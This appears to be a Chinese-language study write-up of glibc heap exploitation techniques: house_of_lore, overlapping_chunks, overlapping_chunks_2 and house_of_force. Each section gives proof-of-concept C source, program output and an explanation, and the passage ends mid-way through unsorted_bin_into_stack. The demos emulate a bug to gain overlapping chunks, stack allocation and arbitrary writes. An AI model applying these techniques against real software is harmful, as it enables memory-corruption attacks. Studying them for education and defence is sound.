DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique.
```

这里的漏洞很简单，就是 off-by-null，通过 `a` 溢出了一字节到已经被释放了的 `b`，使得 `b` 的 `chunk_size` 被改变。这里需要注意的是，新版本 glibc 增加了检验机制，如果 `chunksize(P) != prev_size (next_chunk(P))` 则会报错，那么如何绕过呢？

我们知道 P 是指 chunk 指针，也就是 `b-0x10`，那么 `b-0x8` 就是这里的 `chunksize(P)`，被 off-by-null 后变成 0x200。而 `next_chunk(P)` 则为 `b-0x10+0x200 = b+0x1f0`。所以 `prev_size(next_chunk(P))` 实际上就是 `*(b+0x1f0)`。那么我们提前修改 `b+0x1f0 = 0x200` 既绕过了验证。

随后申请了 0x100 的 b1，位于原来 b 的位置上，这时原本应该更新的是 `c` 的 `prev_size`，但是由于我们刚才说的 `prev_size(next_chunk(P))` 等于 `*(b+0x1f0)`，实际上被更新的位置是 `b+0x1f0`，也就是 `c.prev_size - 0x10`。换句话说，`c` 依然认为它前面的块的大小是 0x210。

于是我们在 `b1` 下面申请 0x80 的 `b2`，尽管它被夹在 `b1` 和 `c` 中间，当我们释放 `b1` 和 `c` 时两者依旧会合并，但我们依然控制着 `b2` 指针！这个时候申请 0x300 的 `d`，它还是会被放到 `b1` 的位置，那么通过 `d` 就可以完全控制 `b2` 这个 chunk。

## house_of_lore

源码：

```c
/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.

[...]

else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){

                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }

       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;

       [...]

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ puts("Nice jump d00d"); exit(0); }

int main(int argc, char * argv[]){


  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};

  fprintf(stderr,"\nWelcome to the House of Lore\n");
  fprintf(stderr,"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
  fprintf(stderr,"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");

  fprintf(stderr,"Allocating the victim chunk\n");
  intptr_t *victim = malloc(100);
  fprintf(stderr,"Allocated the first small chunk on the heap at %p\n", victim);

  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
  intptr_t *victim_chunk = victim-2;

  fprintf(stderr,"stack_buffer_1 at %p\n", (void*)stack_buffer_1);
  fprintf(stderr,"stack_buffer_2 at %p\n", (void*)stack_buffer_2);

  fprintf(stderr,"Create a fake chunk on the stack\n");
  fprintf(stderr,"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"
         "in second to the last malloc, which putting stack address on smallbin list\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr,"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "
         "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake"
         "chunk on stack");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  fprintf(stderr,"Allocating another large chunk in order to avoid consolidating the top chunk with"
         "the small one during the free()\n");
  void *p5 = malloc(1000);
  fprintf(stderr,"Allocated the large chunk on the heap at %p\n", p5);


  fprintf(stderr,"Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free((void*)victim);

  fprintf(stderr,"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
  fprintf(stderr,"victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr,"victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr,"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr,"This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  void *p2 = malloc(1200);
  fprintf(stderr,"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);

  fprintf(stderr,"The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr,"victim->fwd: %p\n", (void *)victim[0]);
  fprintf(stderr,"victim->bk: %p\n\n", (void *)victim[1]);

  //------------VULNERABILITY-----------

  fprintf(stderr,"Now emulating a vulnerability that can overwrite the victim->bk pointer\n");

  victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

  //------------------------------------

  fprintf(stderr,"Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr,"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");

  void *p3 = malloc(100);


  fprintf(stderr,"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(100);
  fprintf(stderr,"p4 = malloc(100)\n");

  fprintf(stderr,"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

  fprintf(stderr,"\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
}
```

输出：

```
Welcome to the House of Lore
This is a revisited version that bypass also the hardening check introduced by glibc malloc
This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23

Allocating the victim chunk
Allocated the first small chunk on the heap at 0x2006010
stack_buffer_1 at 0x7ffd3c0b7460
stack_buffer_2 at 0x7ffd3c0b7440
Create a fake chunk on the stack
Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list
Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
Allocated the large chunk on the heap at 0x2006080
Freeing the chunk 0x2006010, it will be inserted in the unsorted bin

In the unsorted bin the victim's fwd and bk pointers are nil
victim->fwd: (nil)
victim->bk: (nil)

Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin
This means that the chunk 0x2006010 will be inserted in front of the SmallBin
The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to 0x2006470
The victim chunk has been sorted and its fwd and bk pointers updated
victim->fwd: 0x7fddc3aecbd8
victim->bk: 0x7fddc3aecbd8

Now emulating a vulnerability that can overwrite the victim->bk pointer
Now allocating a chunk with size equal to the first one freed
This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer
This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
p4 = malloc(100)

The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fddc3aecbd8

p4 is 0x7ffd3c0b7470 and should be on the stack!
Nice jump d00d
```

逻辑还是比较简单的，就是通过修改栈变量以及堆上 small chunk `victim` 的 `bk` 指针构造出一条完整的双向链表，以通过 small bin 检查从而使得 `malloc` 返回一个栈上地址。注意中间关键的一步是申请了一个不能被 unsorted bin 和 small bin 满足的 chunk，因此只能从 top chunk 切割，这时原本在 unsorted bin 中的 `victim` 就进入了 small bin。

## overlapping_chunks

源码：

```c
/*

 A simple tale of overlapping chunk.
 This technique is taken from
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(int argc , char* argv[]){


    intptr_t *p1,*p2,*p3,*p4;

    fprintf(stderr,"\nThis is a simple chunks overlapping problem\n\n");
    fprintf(stderr,"Let's start to allocate 3 chunks on the heap\n");

    p1 = malloc(0x100 - 8);
    p2 = malloc(0x100 - 8);
    p3 = malloc(0x80 - 8);

    fprintf(stderr,"The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

    memset(p1,'1', 0x100 - 8);
    memset(p2,'2', 0x100 - 8);
    memset(p3,'3', 0x80 - 8);

    fprintf(stderr,"\nNow let's free the chunk p2\n");
    free(p2);
    fprintf(stderr,"The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n");

    fprintf(stderr,"Now let's simulate an overflow that can overwrite the size of the\nchunk freed p2.\n");
    fprintf(stderr,"For a toy program, the value of the last 3 bits is unimportant;"
        "however, it is best to maintain the stability of the heap.\n");
    fprintf(stderr,"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
        "to assure that p1 is not mistaken for a free chunk.\n");

    int evil_chunk_size = 0x181;
    int evil_region_size = 0x180 - 8;
    fprintf(stderr,"We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n",
         evil_chunk_size, evil_region_size);

    *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2

    fprintf(stderr,"\nNow let's allocate another chunk with a size equal to the data\n"
           "size of the chunk p2 injected size\n");
    fprintf(stderr,"This malloc will be served from the previously freed chunk that\n"
           "is parked in the unsorted bin which size has been modified by us\n");
    p4 = malloc(evil_region_size);

    fprintf(stderr,"\np4 has been allocated at %p and ends at %p\n", (char *)p4, (char *)p4+evil_region_size);
    fprintf(stderr,"p3 starts at %p and ends at %p\n", (char *)p3, (char *)p3+0x80-8);
    fprintf(stderr,"p4 should overlap with p3, in this case p4 includes all p3.\n");

    fprintf(stderr,"\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,"
        "and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n");

    fprintf(stderr,"Let's run through an example. Right now, we have:\n");
    fprintf(stderr,"p4 = %s\n", (char *)p4);
    fprintf(stderr,"p3 = %s\n", (char *)p3);

    fprintf(stderr,"\nIf we memset(p4,'4', %d), we have:\n", evil_region_size);
    memset(p4,'4', evil_region_size);
    fprintf(stderr,"p4 = %s\n", (char *)p4);
    fprintf(stderr,"p3 = %s\n", (char *)p3);

    fprintf(stderr,"\nAnd if we then memset(p3,'3', 80), we have:\n");
    memset(p3,'3', 80);
    fprintf(stderr,"p4 = %s\n", (char *)p4);
    fprintf(stderr,"p3 = %s\n", (char *)p3);
}
```

输出：

```
This is a simple chunks overlapping problem

Let's start to allocate 3 chunks on the heap
The 3 chunks have been allocated here:
p1=0x1b9a010
p2=0x1b9a110
p3=0x1b9a210

Now let's free the chunk p2
The chunk p2 is now in the unsorted bin ready to serve possible
new malloc() of its size
Now let's simulate an overflow that can overwrite the size of the
chunk freed p2.
For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap.
To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk.
We are going to set the size of chunk p2 to to 385, which gives us
a region size of 376

Now let's allocate another chunk with a size equal to the data
size of the chunk p2 injected size
This malloc will be served from the previously freed chunk that
is parked in the unsorted bin which size has been modified by us

p4 has been allocated at 0x1b9a110 and ends at 0x1b9a288
p3 starts at 0x1b9a210 and ends at 0x1b9a288
p4 should overlap with p3, in this case p4 includes all p3.

Now everything copied inside chunk p4 can overwrites data on
chunk p3, and data written to chunk p3 can overwrite data
stored in the p4 chunk.

Let's run through an example. Right now, we have:
p4 = xK�8�
p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333�

If we memset(p4,'4', 376), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�
p3 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444�

And if we then memset(p3,'3', 80), we have:
p4 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444�
p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444�
```

源程序和输出结果里已经相当清晰了，这里就是修改了一个 unsorted bin 中的 free chunk 的 `chunk_size`，然后把它申请回来，这样它的一部分就和原本紧挨在下面的 chunk 重叠了，那么向它的这部分写入数据就会影响到下面的这个 chunk，反之亦然。

## overlapping_chunks_2

源码：

```c
/*
 Yet another simple tale of overlapping chunk.

 This technique is taken from
 https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.

 This is also referenced as Nonadjacent Free Chunk Consolidation Attack.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main(){

  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
  int prev_in_use = 0x1;

  fprintf(stderr,"\nThis is a simple chunks overlapping problem");
  fprintf(stderr,"\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n");
  fprintf(stderr,"\nLet's start to allocate 5 chunks on the heap:");

  p1 = malloc(1000);
  p2 = malloc(1000);
  p3 = malloc(1000);
  p4 = malloc(1000);
  p5 = malloc(1000);

  real_size_p1 = malloc_usable_size(p1);
  real_size_p2 = malloc_usable_size(p2);
  real_size_p3 = malloc_usable_size(p3);
  real_size_p4 = malloc_usable_size(p4);
  real_size_p5 = malloc_usable_size(p5);

  fprintf(stderr,"\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
  fprintf(stderr,"\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
  fprintf(stderr,"\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
  fprintf(stderr,"\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
  fprintf(stderr,"\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));

  memset(p1,'A',real_size_p1);
  memset(p2,'B',real_size_p2);
  memset(p3,'C',real_size_p3);
  memset(p4,'D',real_size_p4);
  memset(p5,'E',real_size_p5);

  fprintf(stderr,"\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n");

  free(p4);

  fprintf(stderr,"\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE

  fprintf(stderr,"\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 (since p2 + size_p2 now point to p4) \n");
  fprintf(stderr,"\nThis operation will basically create a big free chunk that wrongly includes p3\n");
  free(p2);

  fprintf(stderr,"\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");

  p6 = malloc(2000);
  real_size_p6 = malloc_usable_size(p6);

  fprintf(stderr,"\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n");
  fprintf(stderr,"\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
  fprintf(stderr,"\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3);

  fprintf(stderr,"\nData inside chunk p3: \n\n");
  fprintf(stderr,"%s\n",(char *)p3);

  fprintf(stderr,"\nLet's write something inside p6\n");
  memset(p6,'F',1500);

  fprintf(stderr,"\nData inside chunk p3: \n\n");
  fprintf(stderr,"%s\n",(char *)p3);
}
```

输出：

```
This is a simple chunks overlapping problem
This is also referenced as Nonadjacent Free Chunk Consolidation Attack

Let's start to allocate 5 chunks on the heap:

chunk p1 from 0x17c9010 to 0x17c93f8
chunk p2 from 0x17c9400 to 0x17c97e8
chunk p3 from 0x17c97f0 to 0x17c9bd8
chunk p4 from 0x17c9be0 to 0x17c9fc8
chunk p5 from 0x17c9fd0 to 0x17ca3b8

Let's free the chunk p4.
In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4

Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2
with the size of chunk_p2 + size of chunk_p3

Now during the free() operation on p2, the allocator is fooled to think that
the nextchunk is p4 (since p2 + size_p2 now point to p4)

This operation will basically create a big free chunk that wrongly includes p3

Now let's allocate a new chunk with a size that can be satisfied by the previously freed chunk

Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and
we can overwrite data in p3 by writing on chunk p6

chunk p6 from 0x17c9400 to 0x17c9bd8
chunk p3 from 0x17c97f0 to 0x17c9bd8

Data inside chunk p3:

CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�

Let's write something inside p6

Data inside chunk p3:

FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�
```

和上一个的区别在于，这次修改的是 allocated chunk 的 `chunk_size`。首先申请五个大小超过 fastbin 范围的 chunk，然后 `free(p4)`。随后通过 `p1` 的堆溢出修改 `p2` 的 `chunk_size` 为 `p2` 与 `p3` 的 `chunk_size` 之和。这就导致在 `free(p2)` 时，分配器认为需要释放 `chunk_size2+chunk_size3` 这么大一块内存，而下一块 chunk 恰好是同样空闲的 `p4`，这样就会将原本不相邻的 `p2` 和 `p4` 合并释放，中间的 `p3` 则成了最大受害者。

这时再申请一块 `chunk_size2+chunk_size3` 的 chunk`p6`，它就和 `p3` 重叠了，控制了整块 `p3` 的数据。

## house_of_force

源码：

```c
/*

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum
   (http://phrack.org/issues/66/10.html)

   Tested in Ubuntu 14.04, 64bit.

*/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char bss_var[] ="This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
    fprintf(stderr,"\nWelcome to the House of Force\n\n");
    fprintf(stderr,"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
    fprintf(stderr,"The top chunk is a special chunk. Is the last in memory "
        "and is the chunk that will be resized when malloc asks for more space from the os.\n");

    fprintf(stderr,"\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
    fprintf(stderr,"Its current value is: %s\n", bss_var);



    fprintf(stderr,"\nLet's allocate the first chunk, taking space from the wilderness.\n");
    intptr_t *p1 = malloc(256);
    fprintf(stderr,"The chunk of 256 bytes has been allocated at %p.\n", p1 - 2);

    fprintf(stderr,"\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
    int real_size = malloc_usable_size(p1);
    fprintf(stderr,"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n", real_size + sizeof(long)*2);

    fprintf(stderr,"\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

    //----- VULNERABILITY ----
    intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));
    fprintf(stderr,"\nThe top chunk starts at %p\n", ptr_top);

    fprintf(stderr,"\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
    fprintf(stderr,"Old size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
    *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;
    fprintf(stderr,"New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long))));
    //------------------------

    fprintf(stderr,"\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
       "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
       "overflow) and will then be able to allocate a chunk right over the desired region.\n");

    /*
     * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
     * new_top = old_top + nb
     * nb = new_top - old_top
     * req + 2sizeof(long) = new_top - old_top
     * req = new_top - old_top - 2sizeof(long)
     * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
     * req = dest - old_top - 4*sizeof(long)
     */
    unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;
    fprintf(stderr,"\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
       "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
    void *new_ptr = malloc(evil_size);
    fprintf(stderr,"As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr - sizeof(long)*2);

    void* ctr_chunk = malloc(100);
    fprintf(stderr,"\nNow, the next chunk we overwrite will point at our target buffer.\n");
    fprintf(stderr,"malloc(100) => %p!\n", ctr_chunk);
    fprintf(stderr,"Now, we can finally overwrite that value:\n");

    fprintf(stderr,"... old string: %s\n", bss_var);
    fprintf(stderr,"... doing strcpy overwrite with \"YEAH!!!\"...\n");
    strcpy(ctr_chunk,"YEAH!!!");
    fprintf(stderr,"... new string: %s\n", bss_var);


    // some further discussion:
    //fprintf(stderr,"This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
    //fprintf(stderr,"This because the main_arena->top pointer is setted to current av->top + malloc_size "
    //    "and we \nwant to set this result to the address of malloc_got_address-8\n\n");
    //fprintf(stderr,"In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
    //fprintf(stderr,"The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
    //fprintf(stderr,"After that a new call to malloc will return av->top+8 (+8 bytes for the header),"
    //    "\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");

    //fprintf(stderr,"The large chunk with evil_size has been allocated here 0x%08x\n",p2);
    //fprintf(stderr,"The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);

    //fprintf(stderr,"This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
}
```

输出：

```
Welcome to the House of Force

The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.

In the end, we will use this to overwrite a variable at 0x602060.
Its current value is: This is a string that we want to overwrite.

Let's allocate the first chunk, taking space from the wilderness.
The chunk of 256 bytes has been allocated at 0x13b3000.

Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
Real size (aligned and all that jazz) of our allocated chunk is 280.

Now let's emulate a vulnerability that can overwrite the header of the Top Chunk

The top chunk starts at 0x13b3110

Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
Old size of top chunk 0x20ef1
New size of top chunk 0xffffffffffffffff

The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
Next, we will allocate a chunk that will get us right up against the desired region (with an integer
overflow) and will then be able to allocate a chunk right over the desired region.

The value we want to write to at 0x602060, and the top chunk is at 0x13b3110, so accounting for the header size,
we will malloc 0xffffffffff24ef30 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x13b3110

Now, the next chunk we overwrite will point at our target buffer.
malloc(100) => 0x602060!
Now, we can finally overwrite that value:
... old string: This is a string that we want to overwrite.
... doing strcpy overwrite with "YEAH!!!"...
... new string: YEAH!!!
```

这个例子里要覆盖的地址位于 bss 段，处于 heap 段的下方，但是 heap 是向高地址生长的。所以这里的核心思想是利用整数溢出。

首先需要存在堆溢出漏洞。我们分配一个 `chunk0`，此时堆上只有两个 chunk：`chunk0` 和 top chunk。利用溢出修改 top chunk 的 `chunk_size` 为 `-1`，即 `0xffffffffffffffff`。这样做是因为后面需要申请很大的 chunk 进行整数溢出，这很可能导致 top chunk 大小不够，不去从 top chunk 切割而是调用 `mmap()`。伪造了 top chunk 的大小后，在后面申请大 chunk 时就不会触发 `mmap()`，确保了申请的大 chunk 也是从 top chunk 切割的。

接下来我们申请一个 `evil_size` 大小的 chunk，使得申请后 top chunk 指针（经过整数溢出）指向我们想要覆盖的变量 `bss_var` 的前面。这个 `evil_size` 的计算方法如下：

```
The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
* new_top = old_top + nb
* nb = new_top - old_top
* req + 2sizeof(long) = new_top - old_top
* req = new_top - old_top - 2sizeof(long)
* req = dest - 2sizeof(long) - old_top - 2sizeof(long)
* req = dest - old_top - 4*sizeof(long)
```

这时再次 `malloc`，得到的就是指向 `bss_var` 的指针了。

## unsorted_bin_into_stack

源码：

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main() {
  intptr_t stack_buffer[4] = {0};

  fprintf(stderr,"Allocating the victim chunk\n");
  intptr_t* victim = malloc(0x100);

  fprintf(stderr,"Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
  intptr_t* p1 = malloc(0x100);

  fprintf(stderr,"Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
  free(victim);

  fprintf(stderr,"Create a fake chunk on the stack");
